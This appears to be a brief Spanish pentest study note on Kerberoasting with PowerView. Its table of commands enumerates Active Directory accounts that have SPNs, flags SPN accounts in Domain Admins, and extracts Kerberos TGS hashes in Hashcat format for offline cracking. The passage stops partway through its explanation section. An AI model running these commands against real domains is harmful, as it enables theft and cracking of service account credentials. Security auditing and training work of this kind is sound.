# Resumen rápido - Kerberoasting con PowerView

| Comando | Qué hace |
|---|---|
| `Get-DomainUser -SPN` | Enumera usuarios del dominio que tienen un SPN configurado. Estas cuentas suelen ser cuentas de servicio y pueden ser objetivo de Kerberoasting. |
| `Get-DomainUser -SPN \| Where-Object {$_.memberof -match 'Domain Admins'}` | Busca cuentas con SPN que además pertenecen al grupo `Domain Admins`. Si devuelve resultados, es un hallazgo crítico. |
| `Get-DomainUser \| Get-DomainSPNTicket -Format Hashcat \| Select-Object -ExpandProperty Hash` | Solicita tickets Kerberos TGS para cuentas con SPN y extrae los hashes en formato compatible con Hashcat. |
| `Get-DomainUser -Identity <User> \| Get-DomainSPNTicket -Format Hashcat \| Select-Object -ExpandProperty Hash` | Solicita el ticket Kerberos TGS de un usuario específico y extrae el hash en formato Hashcat. |

## Explicación breve

### `Get-DomainUser -SPN`

Enumera usuarios que tienen configurado el atributo:
ServicePrincipalName
